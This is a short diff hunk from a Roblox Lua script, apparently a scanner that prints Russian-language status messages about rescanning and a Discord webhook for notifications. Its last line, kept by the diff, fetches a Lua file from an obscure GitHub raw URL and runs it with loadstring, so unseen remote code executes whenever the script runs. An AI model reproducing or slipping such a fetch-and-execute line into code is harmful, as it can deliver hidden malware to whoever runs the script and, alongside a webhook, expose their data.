@@ -562,5 +562,5 @@ UserInputService.InputBegan:Connect(function(input, gpe)
 end)
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ldkoedkeo/eblan2222/refs/heads/main/noob.lua"))()
+
